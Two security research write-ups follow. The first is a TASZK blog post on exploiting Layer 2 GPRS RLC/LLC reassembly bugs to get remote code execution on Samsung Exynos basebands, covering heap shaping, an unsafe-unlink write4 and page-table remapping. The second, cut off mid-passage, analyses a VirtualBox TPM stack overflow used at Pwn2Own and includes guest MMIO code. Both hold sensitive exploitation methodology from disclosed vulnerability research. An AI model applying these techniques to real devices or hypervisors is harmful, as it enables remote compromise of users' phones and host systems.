https://labs.taszk.io/articles/post/there_will_be_bugs/,"   Unburdened By What Has Been: Exploiting New Attack Surfaces in Radio Layer 2 for Baseband RCE on Samsung Exynos - taszk.io labs        Home Articles Advisories      Get in touch        Unburdened By What Has Been: Exploiting New Attack Surfaces in Radio Layer 2 for Baseband RCE on Samsung Exynos  2024-07-29  by Daniel Komaromy, Lorant Szabo, Laszlo Szapula  Samsung baseband  We have written extensively about remote baseband vulnerability research in the past, examining various vendors’ baseband OS micro-architectures and exploring their implementations for remotely exploitable bugs. So have many others. One might say, our research exists in the context in which it lives and what came before it: whether it be about finding (1, 2, 3, 4, 5, 6, 7) or exploiting (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14) vulnerabilities. However, one area that has been absent from prior art was a direct examination of lower layers of Radio Layer protocols for security vulnerabilities. For this reason, last year we decided to explore new attack surfaces and bug patterns in Layer 2 of Radio Access Technologies such as 2G. A result of our work was a new baseband RCE exploit against Samsung Exynos smartphones, based on a chain of vulnerabilities that are described in our newly released disclosures: 1, 2. We published this work earlier this year at CSW and then at GeekCon. For those of you who may have missed these opportunities (and can’t crack the leet password protecting the CSW talk video), in this blogpost we describe how we exploited our chain of vulnerabilities to gain full arbitrary remote code execution. As a play on the theme of mining a new, deeper layer for bugs, we named our presentation There Will Be Bugs. So first, we discuss what kind of attack surfaces prop up in Layer 2 and what we targeted, then we describe the exploitation of the vulnerabilities we have chosen. Before that, we draw attention to another indication of the soundness of our “prediction” (that there will be bugs to be found by targeting L2): the upcoming Black Hat talk by Muensch et al. on “Finding Baseband Vulnerabilities by Fuzzing Layer 2”. Be sure to check that one out too if you are interested in this topic. Layer 2: There Will Be Bugs Layer 2 protocols in 3GPP Radio Access Technologies (RAT) such as 2G/3G/4G/5G serve much the same purpose as L2 i.e. data link layer protocols in the OSI model: taking care of transferring data between nodes of the RAN (radio access network) over the physical layer. In other words, these protocols implement the transfer of packets direct over the radio link connection, i.e. between a mobile device (UE) and a radio tower (which can be a BTS, nodeB, eNB, gNB - depending on the particular RAT). In the case of GSM, the L2 protocol is LAPDm. GPRS introduced in its place the MAC, RLC, and LLC sublayer protocols (and the Layer 3 protocol SNDCP on top) and the evolved technologies (3/4/5G) simplified that combination to MAC, RLC, and PDCP as the L2 protocol stack. Each of these protocols have their own specifications, frame encoding formats, and procedure definitions, but what they share in common are the functionalities they provide, as a bridge between Layers 1 and 3: use smaller (than L3), fixed sized data frames as obvious from the above, implement L3 PDU segmentation and re-assembly procedures over L2 data frames since L3 protocols are numerous, implement the required multiplexing support for delivering to the correct recipient endpoint (called Service Access Points in 3GPP parlour) support unacknowledged and acknowledged modes of transfer and provide support for sliding windows for the later in the later, provide the support for in-order delivery and handling sliding ack windows besides data frames, implement control frames that carry configuration commands for the layer itself in the upper sublayers such as LLC/SNDCP or PDCP in the newer RATS, implement ciphering and compression for the SDUs they carry (and re-assemble) One of the things that jumps out even from this generic description, is the recognition that this layer (one of its sublayers, depending on the RAT in question, to be precise) is the one in 3GPP responsible for applying ciphering to the enveloped SDUs of the upper layer that it serves. This means, of course, that all the ciphering (encryption / integrity protection) meant to thwart malicious over-the-air message injection (see: “fake base station” based attacks) only comes into play AFTER the PDUs on these sublayers have been processed. In other words, any processing that pertains to headers of these lower sublayer DATA frames as well as the processing of the control frames belonging to these sublayers are going to include cases where the ciphering is just not of any concern at all. That itself makes any possible memory corruption vulnerabilities in frame decoding in these sublayers quite interesting. In L3, most published memory corruption bugs are classic decoding-a-variable-length-field vulnerabilities, where a length representation in a single packet is encoded in some malformed way, whether it be a length value in a TLV encoded field used unchecked or as part of an erroneous integer arithmetic, an ignored grammar constraint on the length of an ASN1 encoded SS or RRC packet SEQOF type field, or a mishandled recursive repetition encoded variable length field in CSN1-using 2G Radio Resource Management packets, to name a few prominent examples from the prior art. Despite the much shorter frame lengths in L2 usually restricting the practical usefulness of such bugs, some of the same can apply to L2 too. In particular, 2G RLC uses the same CSN1 encoding as 2G RRM. But there was a more interesting opportunity specific to this layer, that we decided to take a look at: segmentation and re-assembly procedures themselves. In a way, the idea is to flip the “message lengths are too short for good decoding bugs” logic and look specifically for issues in the re-assembly code. This, after all, is not a particularly unique idea, classic networking stacks have a rich history of such problems in TCP/IP code as an example. (For one, this finding by Ivan Fratric is an IPv4 fragment re-assembly vulnerability in baseband code itself!) When it comes to L2 protocols of 3GPP specifications, this area is particularly interesting, because there’s not one standard way re-assembly procedures happen. Instead, virtually every case defines its own way of implementing the re-assembly procedure: from LAPDm, to GPRS RLC data frames, to E-GPRS RLC data frames, to segmented L3 SDUs carried in various L2 control frames (similarly to how RRM control messages can carry segments for ETWS for example), to segmentation in RLC control frame payloads to allow for larger-than-frame-size control messages field sizes to be accumulated over multiple RLC control frames, and on and on with the newer RATs after 2G as well. Our first look into this area yielded CVE-2022-21744, an example of the last case enumerated in the previous sentence: a heap buffer overlow in Mediatek basebands found in the processing of CSN1 encoded GPRS Packet Neighbour Cell Data packets, which are meant to allow repeated containers to be sent over multiple RLC control frames and re-assembled into one list. Check out the linked blog post for more details on this vulnerability. After we looked at Mediatek, we also looked into segmentation vulnerabilities in the context of Samsung Exynos basebands. In this case, we audited the code responsible for handling LLC PDU re-assembly procedures for RLC data frames. In total, we have identified 5 vulnerabilities, which are outlined in our just published advisories: 1, 2. In the rest of this post, we describe how we turned a chain of these vulnerabilities into arbitrary remote code execution on Samsung Exynos basebands! Recap: The Vulnerabilities CVE-2023-41111 is actually two vulnerabilities rolled into one CVE: a logic bug and an OOB access bug that can be combined to overflow the array the Samsung RLC code uses to store descriptors to LLC data frame fragments, until the condition is triggered to re-assemble them into the original LLC PDU and send to the LLC sublayer. CVE-2023-41112 refers to a heap overflow vulnerability, caused by the classic copy-first-check-for-exit-condition-after coding mistake in copy loops, that can be triggered during the re-assembly procedure itself. This vulnerability would not be reachable without CVE-2023-41111, which enables the creation of a situation where the list of fragments used to allocate the to-be-reassambled LLC PDU will differ from the list of fragments that are copied together. For details on each vulnerability, check out the advisories! For the rest of this post, we just need to know that we have a heap overflow primitive where: we control the size of the allocation (any up to 1560) we control the values written, including the overflowing bytes we control the exact length of the overflow (limited by the max value of an RLC data frame size) we cannot control the lifetime of the overflowing chunk, which will always get freed immediately following the overflow Baseband Heap Internals Before we describe the method we used, a quick recap of the Samsung Exynos baseband’s heap internals. The general heap implementation for the common malloc/free API comprises several implementations, in particular there is a front-end and a back-end allocator. (More precisely, that are 6 possible heap classes (mids), more than 2 are used, but we can focus on 1 and 4 for this discussion.) The Font-end Allocator The front-end allocator (mid4) is a custom pool-based allocator. The following diagram shows the fields of the 32 byte common heap header that is inline for chunks, used by the front-end allocator: Of note is that the guard value is fix (0xAA bytes). This is a pool-based allocator, using pool slot sizes of powers of 2, from 32 to 2048. The diagram below shows the global control structures that define the front-end allocator’s state and behavior: Each pool is 2048 bytes long and the heap pre-allocates a huge amount of pools. Which is to say, pool instances are not pre-allocated for size classes or otherwise quarantined from one another, but are simply assigned to a given size class on demand, whenever a fresh pool instance is needed. That happens when the available pool lookaside list for the given size class is empty. Once a pool is chosen during allocation, the first available slot is always the one picked. As usual, the freeing simply means flipping the corresponding bit in the bitmap descriptor belonging to the given pool instance. The Back-end Allocator The back-end allocator (mid1) is much simpler and less unique: it is a simple old-school coallescing dlmalloc. This is the format of the 20 byte inline header for mid1 chunks: Shannon Heap Exploit Technique: Heap Overflow to Write4 As several others have already noted publicly (not that it matters, but we were also aware of and documented this method to Samsung in our report before those publications last year), the Achilles’ heel of the back-end allocator is that its free chunk unlinking procedure (during free chunk coallescing) includes the classic unsafe-unlink write4 weakness. In this section we quickly recap how this standard technique is triggered in the Samsung Exynos baseband heap. Since all allocations that we work with for our exploit happen on the front-end allocator, we need a way to make a free() call that we target use the back-end algorithm. As it’s been also described before for this technique, this is also straightforward. The Samsung Exynos baseband RTOS uses a common free() API, which directly uses the provided chunk’s first field (mid) to decide which allocator type the freed chunk belongs to, and then triggers the front-end vs back-end free algorithm on it accordingly. (Since the entire front-end heap arena is allocated as one huge chunk out of the back-end heap, it follows that every legit front-end allocation’s address will fall within the valid range for the back-end heap as well, so this isn’t an issue either.) Therefore, in order to make use of the write4 technique, all we need to do is corrupt the first field (mid) of the header. One wrinkle, that is confusing at first, is that the front-end vs back-end free functions that are called by the wrapper free function on the chunk behave differently. Regardless of which one is chosen by the wrapper free, the pointer passed in is to the entire chunk, i.e. to the start of the common header, with the mid field as its first field. However: when the front-end heap free is chosen, the function treats it as such, a pointer to a buffer starting with a common heap header, when the back-end heap free is chosen, the function treats it as a pointer to the payload part of a back-end allocated chunk, meaning it subtracts the size of the back-end heap header (20) from the passed pointer to get the location of the header. In other words, in order to create a fake back-end chunk (with which we can trigger an unsafe unlink coallescing), the fake back-end chunk header has to be placed in front of the overflowed chunk, and the the overflowed chunk’s common heap header’s mid field has to be replaced with 1. The following contextualizes how the overflowing chunk’s relevant offsets towards its end need to be populated in order to trigger write4s during the unsafe unlink that we force: Heap Shaping The next step was figuring out a way to reliably trigger the write4. There are two complicating factors: First, the baseband heap is pretty busy, in particular on the control flow path of processing RLC data frames itself. Second, in the case of this vulnerability, the overflowing chunk is always freed right after the overflow happens. Why this happens is that the chunk we are overflowing from is the re-assembled LLC PDU, which is then passed to the LLC sublayer from RLC, which then will either discard it (if the LLC header/footer values of the PDU are invalid), or it will take out the SDU from the PDU by removing the headers and footer. This SDU becomes a new allocation, to which the content is copied, with the original chunk containing the re-assembled LLC PDU then discarded. Due to the second one, we always must reclaim the chunk we overflowed from before triggering the free of the chunk after it. But do to the first one, getting back the same exact chunk reliably is not that straightforward - not to mention getting our chunk next to an allocated chunk whose freeing we can trigger explicitly when desired. This later point is again crucial, since the free (of the overflown chunk) mustn’t occur before we managed to re-claim the overflowing chunk. For this reason, we had to look for ways to control the baseband heap layout in a reliable manner. As it happens, we found a perfectly capable heap shaping primitive within the same codebase that we’ve been looking at: Layer 2 sublayer-to-sublayer data packet transmission procedures. Heap Shaping with LLC In the previous section we touched upon what happens once the re-assembled PDU is forwarded from the RLC sublayer. To recap, the PDU arrives at the LLC layer, which is essentially a multiplexer layer, as shown by the following Figure: As we can see, the primary task of the LLC layer is to identify which receiver in Layer 3 should the packet be forwarded to. The recepient in practice can be GPRS MM (control plane), SNDCP (sublayer wrapping IP, the radio technology stack equivalent of Ethernet layer, if you will), or SMS (yes, SMSes can be sent over GPRS too in 3GPP). The multiplexing is done by extracting the SAPI (Service Access Point Identifier) value from the LLC PDU header. But the LLC packet format includes additional fields in the header/footer, which add: a checksum, for error detection/correction an ability to send control packets (U frames, S frames) in order to configure the LLC sublayer behavior, including state management for each SAPI, supporting both Unacknowledged (UA) and Acknowledged Mode (AM) In UA, the LLC sublayer is a true multiplexer, acting like UDP. However in AM mode, each packet (I frame) can be acknowledged, and a window is maintained for acceptable I frames, within which window the LLC sublayer guarantees in-order delivery for the upper layer recipient. Bsaed on the specification, the network has a great deal of control over the LLC operation modes: the window size can be configured by the network using U frames the switch from the default UA mode to AM mode can be directed by the network also by U frames (specifically, an SABM message), individually for each SAPI (but only allowed for the SNDCP designated SAPIs: 3, 5, 9, 11) acknowledgments for individual I frames are still dictated by the sender: even if AM Mode is turned on, an I frame is only acknowledged if the sender requests it Luckily, the AM implementation in Samsung’s code presents us with a great heap shaping primitive: every out-of-order arriving packet is stored in a linked list (not the original re-assembled allocation, but the stripped out LLC SDU) whenever a packet arrives, after extracting the SDU and placing it on the linked list, each in-order one is sent to the SNDCP layer; this sending also uses data copying which results in the freeing of the SDU allocation that was stored in the linked list In other words: if we skip the first index of the current window, we can spray window_size-1 number of allocations, whenenever we want to free the allocations, we can trigger the freeing by sending the I frame with index 0 of the receiving window. And since we have 4 SAPIs to play with, we can engineer a checkerboard allocation by sending I frames to alternating SAPIs and then sending index 0 for only one of the two SAPIs used. This way, we can create a situation where the subsequent overflowing allocation will be guaranteed to fall in front of a chunk that we’ll be able to control the free event for. One wrinkle to keep in mind: the overflowing allocation happening in RLC has a different allocation than the stored allocations, since it includes the stripped out LLC header and footer. We can use that size differential to our advantage and “bump out” the RLC allocations for the heap shaping LLC PDU I frames that we send, making sure that those temporal allocations don’t interfere with the pools for the size class that we engineer our heap feng shui for. Building A Working PoC As we can see, the exploit will have some fairly involved steps, which is a fancy way to say that we expected to end up with a poc using some “magic number” of iterations of heap filling (spraying) steps, as typical in cases like this. In order to test such an approach, we needed a way to inspect what was happening during attempts. Luckily for us, the Samsung Exynos baseband heap already has a very powerful built-in debugging feature. By turning on Debug High mode for the baseband (same functionality since the days of Breaking Band), we get an extra behavior in the heap malloc and free wrapper APIs: besides storing the allocation/free filepath and linenumber information into heap chunk headers, an in-memory ringbuffer of heap events is also populated. Even better, also in Debug High mode, the baseband memory can be easily ramdumped, both on demand from the Android UI even and automatically whenever the baseband crashes. With the ramdump file, it’s trivial to extract the ringbuffer and from it reconstruct a flowchart of sequential heap events. We built a simple Ghidra script to process ramdump files and create an old-school ASCII art visualization of heap states. Here’s a screenshot of the script in action: Using this tool, we were able to iterate spraying variations using the LLC SAPIs, until we found a combination that reliably “smoothed out” the busy pools for the chosen size class and then created the checkerboard pattern of allocations. Exploit Plan To summarize, our exploit plan will contain the following steps: turn on LLC AM mode by sending SABM for each of the 4 SDNCP SAPIs use SAPI 3 to spray the heap for size class 512 (using an I frame size such that the entire LLC PDU falls into 1024 class already, but the stored away LLC SDU fits 512) use SAPI 5 and 9 to create a checkerboard pattern of allocations of fully sprayed pools for the same class free all LLC frame allocations for SAPI 5 by sending in the LLC PDU with index 0 send the malformed RLC data frame to trigger the heap overflow and replace the LLC PDU allocation’s heap header’s mid with value 1 (this overflowing chunk itself will not have a valid checksum when its last 3 bytes are interpreted as such in the LLC sublayer, so it gets discarded right away without extraction of an LLC SDU from it) use SAPI 11 for re-spraying the heap and reclaiming the overflowing chunk, with the payload of the SAPI 11 LLC PDUs containing the fake mid1 headers as needed for the write4 finally, trigger free on SAPI 9 by sending LLC PDU with index 0 The steps visualized, from our presentation: (Note: these pictures, that are also in our slidedecks, ommit the re-spraying step between the final two steps to reclaim the overflowing chunk’s slot before triggering the free that results in the write4.) Heap Shaping Improvements So did this work? Well, sort of. We definitely had a PoC that succeeded at triggering a write-4 sometimes, but it wasn’t reliable enough. In practice, we addressed a few more wrinkles that came up when testing PoCs. The first difficulty was that in practice, Samsung Exynos basebands really don’t seem all that robust when it comes to handling large volume of traffic. Even with a run-of-the-mill SDR and a straightforward, python API based injection implementation, it turns out to be way to easy to “flood” the baseband with messages to the point where frames get dropped (unprocessed by the baseband). At first, we simply wanted to take advantage of LLC AM mode to “rate-limit” our sending, by requesting (and awaiting) the acknowledgement for each I frame we have sent. This worked well, except for one problem: we have learned that the Samsung implementation allocates a context structure for each Traffic Block Flow (TBF) in the MAC sublayer and this allocation happens to fall into the same pool size that we targeted: This is a real problem because, if we keep waiting for ACKs, then the behavior we get is repeated creation (and deletion) of new Uplink (UL) TBFs, which means noise over out attempted heap shaping. Several options exist, such as targeting a different pool, but in our case we went with the KISS method and experimented with sending delays until we were satisfied that the baseband will properly process each LLC I frame. On a related note, once we realized the issue with allowing UL TBFs, we also had to address the fact that the phone itself will try to create Internet connections quite often. These obviously result in additional UL (and DL) TBF traffic at the LLC sublayer. We can also opt for a straightforward solution here: by preventing the PDP Context Creation during GPRS Attachment, we can cause the phone to not even attempt any Internet traffic, because from Android’s size, it will look like there’s no cellular data connection. It’s actually worth stopping here for a second and think about the implications: the baseband allows us to switch LLC AM mode for SAPIs 3/5/9/11 and send LLC I frames containing purported SNDCP packets - despite the fact that no PDP Context has been created! For our 2c, this is a state machine contradiction that shouldn’t be allowed. But it is. Finally, we also mention the most annoying problem: sometimes RLC frames themselves just get dropped. Frame ACK/NAK is a default feature at the RLC layer, and the proper Osmocom code handles this correctly for the RLC frames that it sends out by design. Our original RLC data and control frame injection patch was lazier, UDP-like, if you will. An ideal solution would keep track of the RLC frame ACK/NAK responses that arrive and re-attempt sending for what has failed to be received. In the end, we added an additional patch to the Osmocom code that allowed our PoC to count the number of received Acks for RLC frames and we added another KISS improvement to deal with RLC frame dropping resulting in “disappearing” upper sublayer control plane messages (such as GPRS SM and MM and/or LLC U frames): simply attempting the injection of the necessary initial control messages (such as the LLC SABM U frame for each SAPI) in a loop until they all succeeded. Overcoming Entropy Finally we had a PoC that worked reliably enough that we were able to repeat write4s, i.e. creating a primitive to overwrite N bytes instead of 4 bytes only. The final piece was creating arbitrary code execution from that. Samsung basebands have no ASLR, so for a given firmware variant a lot of addresses will be fix: code, BSS, stack frames. Given that, if the device version + firmware variant is known, nothing stops an exploit with the building blocks described so far to reach reliable code execution by repeatedly triggering the heap overflow to overwrite chosen memory addresses with chosen values, 4 bytes at a time. However, while the device type can be simply extracted from an IMEISV Identity Request’s response, querrying a Samsung phone for its exact firmware variant is not a given. There can be various ways to approach this fingerprinting challenge. The simplest idea would be bruteforcing. For example, we could spend time on collecting firmwares, analyzing variance, and finding out whether we have a low enough bits of entropy in location variance of various in-memory structures whose changed values can be reflected back, such as the Identity values stored in memory that are returned in MM Identity Responses. But this is obviously non-deterministic, may cause crashes or be otherwise unreliable, and would in either case require a larger firmware database maintenance effort. As it turns out, we can do better then fingerprinting: we can make exploitation work even without knowing the exact firmware version or even precise device version! For the explanation let’s focus on newer devices (S20+) that use an MMU (there are techniques for blind exploitation on older, MPU based device variants as well but this is skipped for brevity). In Samsung Exynos basebands, the RTOS uses a standard ARMv7 2 level page table format. The runtime accesses the page table at a known, always fix, device and firmware version agnostic, and writable address (0x40008000). Crucially, the baseband RTOS doesn’t distinguish privilege levels for its tasks: all baseband code runs in supervisor mode, thusly able to read/write the page table directly! So, despite the baseband RTOS having a microkernel and handling SVC calls (syscalls) via its VBAR (which points to 0x40010000), all code runs in context that can modify the virtual memory where the page table is stored. Therefore, we can always just choose an arbitary location that is RW, repeatedly use the arbitrary write to fill shellcode there, and then write into the page table at the right entry slot to make that address XN=0. Now we have shellcode at a known address, all we have to do is jump to it. Alternatively, if we have a good enough heap shaping primitive (like we happen to have), we can use the fact that the size of the heap area is uniformly large enough to overcome firmware version-caused entropy, i.e. by spraying enough pages, we can make sure that a chosen VA will point to our sprayed input. Then, we can turn the address permissions into RWX. Better yet, since the page table is writable, we can modify the AP properties of the 0x40010000 page to RW from RO with a single page table entry write. This allows us to in turn write into where the VBAR is pointed and replace for example the syscall handler. This is a great target for “firmware agnostic” exploitation, because the first page from the start of where the firmware runtime is mapped contains instructions that aren’t affected by firmware variance. This is immediately useful because in the baseband, there is exactly 1 used syscall: abort. Therefore, we can replace the syscall handler with a pointer to our staged shellcode and then trigger the same heap vulnerability again, but this time constructed “less carefully” i.e. triggering an abort on it like the PAL_MEM_GUARD_CORRUPTIONPAL_MEM_GUARD_CORRUPTION abort e.g. by intentionally not covering the 4 guard bytes with “AA” in the overwrite. In fact, we can even use the abort state itself: whenever PAL_MEM_GUARD_CORRUPTION abort is reached, the faulting allocated chunk will actually have a pointer point to it in R7. So now a hijacked abort handler, replaced with a register jump instruction, can jump straight into our shellcode and arbitrary code execution is achieved. (Ok, technically, “straight” means a few assembly instructions, needing a few write4 triggers, to address the BSMA VA transformation that is explained below, as well as to skip over header fields of an allocated chunk to make this work well.) An abort is actually also trivially recoverable at the point of the syscall entry, so continuation of execution is reachable from here quite conveniently as well. Alas, we can manage to execute shellcode without any ROP and without having to know which firmware version the exploit code will run on! The “Baseband Space Mirroring Attack” Except … not quite. When we tried page table rewrites in practice, we have found that it didn’t quite replicate. No matter that we replaced PTE values, the mapping permission behavior didn’t change. Turns out, the issue is caching. Likely because the Samsung baseband mostly uses large pages for almost the entire address space, the number of valid PTE entries is fairly small. We suspected that the issue was that the TLB walks already cache all results, to the point where no valid VA read/write fetch will cause a new access to the memory where the page table itself is stored. The MMU is MMUing, in other words. This is where (name borrowed from KSMA) baseband space “mirroring” comes in. The idea is to pick an arbitrary address, which is not normally mapped into the baseband address space, and then instead of overwriting the targeted PTE, create a new PTE entry for the fake virtual address but backing the same targeted physical address, this time of course using our own set of desired permission bits. The picture below shows an example of a fake VA-PA mapping from 0x30000000 to the original 0x40000000 injected into the page table with the simple write4 primitive: Over-the-Air Implementation In order to demonstrate the exploit, we used a modified Osmocom codebase together with a stock bladeRF software-defined radio. For this, we extended our previously implemented Osmocom patch that adds a scripting API for sending arbitrary messages and filtering/inspecting incoming ones, which we previously implemented for NAS layer injection. The FOSS Osmocom stack already supported GPRS RLC in general, but we had to add some extensions to make the exploit work: support for injecting arbitrary RLC data or control frames into an existing TBF or into a newly created one (added to osmo-pcu) support for enabling LLC AM mode by sending a custom LLC SABM and checking the response (upstream code partially implemented GPRS LLC AM mode support, but it was incomplete; added to osmo-sgsn) support for sending arbitrary LLC PDUs (used for the heap shaping, added to osmo-sgsn) DEMO To close it out, here is a demo video of our Over-the-Air exploit in action! The PoC achieves the following: triggers the heap overflow repeatedly, with the heap layout shaped before each attempt, in order to modify the page table using the “BSMA” attack, making the heap executable and a target function handler writable sprays the heap with our payload shellcode overwrite the handler (reachable by an otherwise innocuous OTA message) to create a convenient hook for executing code, redirecting it to the payload shellcode trigger the “backdoored” handler a few times to demonstrate the added payload in action  Search   Tags Android baseband bootloader dma Huawei kernel MediaTek ota recovery Samsung toctou trustzone  Archives 2018 2021 2022 2023 2024  Authors Daniel Komaromy Daniel Komaromy, Lorant Szabo, Laszlo Szapula kutyacica Lorant Szabo TASZK Security Labs  TOC Layer 2: There Will Be Bugs Recap: The Vulnerabilities Baseband Heap Internals The Font-end Allocator The Back-end Allocator Shannon Heap Exploit Technique: Heap Overflow to Write4 Heap Shaping Heap Shaping with LLC Building A Working PoC Exploit Plan Heap Shaping Improvements Overcoming Entropy The “Baseband Space Mirroring Attack” Over-the-Air Implementation DEMO      Pages Home Articles Advisories Get in touch  Links  Tags  TOC Layer 2: There Will Be Bugs Recap: The Vulnerabilities Baseband Heap Internals The Font-end Allocator The Back-end Allocator Shannon Heap Exploit Technique: Heap Overflow to Write4 Heap Shaping Heap Shaping with LLC Building A Working PoC Exploit Plan Heap Shaping Improvements Overcoming Entropy The “Baseband Space Mirroring Attack” Over-the-Air Implementation DEMO      Company     TASZK Security Labs SLRambla de Catalunya 124, 1-208008 Barcelona, Spain [email protected] pgp:     CA86 EB1A E756 13A6 EB30073F 6BB2 BD92 0E93 5D90  Sitemap Articles Advisories  Community Github Twitter  We provide clients:    customized solutions for unique challenges in the embedded, mobile, automotive, wireless, and telecommunication technology sectors    Fineprint Privacy Policy Disclosure Policy    "
https://qriousec.github.io/post/vbox-pwn2own-2023/,"Analysis of VirtualBox CVE-2023-21987 and CVE-2023-21991 Qrious SecureHomeAboutDark ModeAnalysis of VirtualBox CVE-2023-21987 and CVE-2023-21991Apr 24, 202319 minute readIntroductionHi, I am Trung (xikhud). Last month, I joined Qrious Secure team as a new member, and my first target was to find and reproduce the security bugs that @bienpnn used at the Pwn2Own Vancouver 2023 to escape the VirtualBox VM.Since VirtualBox is an open-source software, I can just download the source code from their homepage. The version of VirtualBox at the time of the Pwn2Own competition was 7.0.6.Exploring VirtualBoxBuilding VirtualBoxThe very first thing I did is to build the VirtualBox and to have a debugging environment. VirtualBox’s developers have published a very detail guide to build it. My setup is below:Host: Windows 10Guest: Windows 10. VirtualBox will be built on this machine.Guest 2 (the guest inside the VirtualBox VM): LUbuntu 18.04.3If you are new to VirtualBox exploitation, you may wonder why I need to install a nested VM. The reason is that VirtualBox contains both kernel mode and user mode components, so I have to install it inside a VM to debug its kernel things.The official building guide offers using VS2010 or VS2019 to build VirtualBox, but you have to use VS2019 to build the version 7.0.6.You can use any other operating system for Guest 2. I choose LUbuntu because it is lightweight. (I have a potato computer lol).Learning VirtualBox source codeVirtualBox source code is large, I can’t just read all of them in a short amount of time. Instead, I find blog posts about pwning VirtualBox on Google and read them. These posts not only show how to exploit VirtualBox but also describe how VirtualBox works, its architecture and stuff like that. These are the very good write-ups that I also recommend you to read if you want to start learning VirtualBox exploitation:https://starlabs.sg/blog/2020/04-adventures-in-hypervisor-oracle-virtualbox-research/https://secret.club/2021/01/14/vbox-escape.htmlhttps://github.com/MorteNoir1/virtualbox_e1000_0dayThe VirtualBox architecture is as follow (the picture is taken from Chen Nan’s slide at HITB2021)The simple rule I learned is that when the guest wants to emulate a device, it send a request to the host’s kernel drivers (R0) first. The host’s kernel have two choices:It can handle that requestOr it can return VINF_XXX_R3_YYYY_ZZZZ. This value means that it doesn’t want to handle the request and the request will be handled by the host’s user mode components (R3).The source code for R0 and R3 is usually in the same file, the only different thing is the preprocessors.#define IN_RING3 corresponds to R3 components#define IN_RING0 corresponds to R0 components#define IN_RC: I don’t know what this is, maybe someone knows can tell me …For example, let’s look at the code in the DevTpm.cpp file:In the image above, when the R0 component receives this request, it will pass to R3 component. The return code (rc) is VINF_IOM_R3_MMIO_WRITE. According to the source code comment, it is “Reason for leaving RZ: MMIO write”. There are other similar values: VINF_IOM_R3_MMIO_READ, VINF_IOM_R3_IOPORT_WRITE, VINF_IOM_R3_IOPORT_READ, …If you want to know more detail about VirtualBox architechture, I suggest you to read the slide by Chen Nan. You can also watch his video here.After having a basic understanding about VirtualBox, the next thing I did is to find some attack vectors. Usually, with VirtualBox, the attack scenario will be an untrusted code running within the guest machine. It will communicate with the host to compromise it. There are two methods a guest OS can talk to the host:Using memory mapped I/OUsing port I/OThese are usually the entry points of an attack, so I look at them first when auditing.The memory mapped region can be created by these functions:PDMDevHlpMmioCreateAndMapPDMDevHlpMmioCreateExAndMap...The IO port can be created by:PDMDevHlpIoPortCreateFlagsAndMapPDMDevHlpPCIIORegionCreateIoPDMDevHlpPCIIORegionCreateMmio2Ex...With memory mapped, we can use the mov or similar instructions to communicate with the host. Meanwhile, we use in, out instruction when we work with IO port.Now I have more understanding about VirtualBox, I can start to look for bugs now. To reduce the time, @bienpnn gave me 2 hints:The OOB write bug is in the TPM componentsThe OOB read bug is in the VGA componentsKnowing that, I open the source code and read files in src/VBox/Devices/Security and src/VBox/Devices/Graphics folders.The OOB write bugAt Pwn2Own, the TPM 2.0 is enabled. It is required to run Windows 11 inside VirtualBox. You will have to enable it manually in the VirtualBox GUI, if you don’t, then the exploit here won’t work.The TPM module is initialized by the two functions tpmR3Construct (R3) and tpmRZConstruct (R0). Both functions register tpmMmioRead and tpmMmioWrite to handle read/write to memory mapped region. rc = PDMDevHlpMmioCreateAndMap(pDevIns, pThis->GCPhysMmio, TPM_MMIO_SIZE, tpmMmioWrite, tpmMmioRead,         IOMMMIO_FLAGS_READ_PASSTHRU | IOMMMIO_FLAGS_WRITE_PASSTHRU,         ""TPM MMIO"", &pThis->hMmio); The memory region is at pThis->GCPhysMmio, which is 0xfed40000 by default.To confirm the communication works as expected, I put a (R0) breakpoint at VBoxDDR0!tpmMmioWrite and write a small C code to run inside the VirtualBox.void *map_mmio(void *where, size_t length) {  int fd = open(""/dev/mem"", O_RDWR | O_SYNC);  if (fd == -1) { /* error */ }  void *addr = mmap(NULL, length, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (off_t)where);  if (addr == NULL) { /* error */ }  return addr; } int main() {  volatile uint8_t* mmio_tpm = (uint8_t *)map_mmio((void *)0xfed40000, 0x5000);  mmio_tpm[0x200] = 0xFF;  return 0; } The breakpoint hit! It works. This is the signature of the tpmMmioWrite function:static DECLCALLBACK(VBOXSTRICTRC) tpmMmioWrite(PPDMDEVINS pDevIns, void *pvUser, RTGCPHYS off, void const *pv, unsigned cb); At the time the breakpoint hit, off is 0x200 (which is the offset from the start of the memory mapped buffer), cb is the number of byte to read, in this case it is 0x1 since we only write 1 byte, pv is the host buffer contains the values supplied by the guest OS, in this case it contains 0xFF only. If we want to write more bytes, we can write it in C like this:*(uint32_t*)(mmio_tpm + 0x200) = 0xFFAABBCC; In assembly form, it will be something like this:mov dword ptr [rdx], 0xFFAABBCC In this case, cb will be 0x4.The tpmMmioWrite function looks fine, after confirming the is no bug in it, I look at tpmMmioRead.static DECLCALLBACK(VBOXSTRICTRC) tpmMmioRead(PPDMDEVINS pDevIns, void *pvUser, RTGCPHYS off, void *pv, unsigned cb) {  /* truncated */  uint64_t u64;  /* truncated */   rc = tpmMmioFifoRead(pDevIns, pThis, pLoc, bLoc, uReg, &u64, cb);  /* truncated */  return rc; } static VBOXSTRICTRC tpmMmioFifoRead(PPDMDEVINS pDevIns, PDEVTPM pThis, PDEVTPMLOCALITY pLoc,          uint8_t bLoc, uint32_t uReg, uint64_t *pu64, size_t cb) {  /* ... */  /* Special path for the data buffer. */  if ( ( ( uReg >= TPM_FIFO_LOCALITY_REG_DATA_FIFO    && uReg < TPM_FIFO_LOCALITY_REG_DATA_FIFO + sizeof(uint32_t))    || ( uReg >= TPM_FIFO_LOCALITY_REG_XDATA_FIFO     && uReg < TPM_FIFO_LOCALITY_REG_XDATA_FIFO + sizeof(uint32_t)))   && bLoc == pThis->bLoc   && pThis->enmState == DEVTPMSTATE_CMD_COMPLETION)  {   if (pThis->offCmdResp <= pThis->cbCmdResp - cb)   {    memcpy(pu64, &pThis->abCmdResp[pThis->offCmdResp], cb);    pThis->offCmdResp += (uint32_t)cb;   }   else    memset(pu64, 0xff, cb);   return VINF_SUCCESS;  } } You can see that there is a branch of code that does a memcpy into the u64, which is a stack variable of tpmMmioRead function. To be able to reach this branch, uReg, bLoc and pThis->enmState must have appropriate values. But don’t worry because we can control all of them, we can also control pThis->offCmdResp and pThis->abCmdResp. There is no check to make sure cb <= sizeof(uint64_t), so maybe there is a stack buffer overflow here? Now I have to find a way to make cb larger than sizeof(uint64_t) (8). I google and found that some AVX-512 instructions can read up to 512 bits (64 bytes) memory. Since my CPU doesn’t support AVX-512, I try AVX2 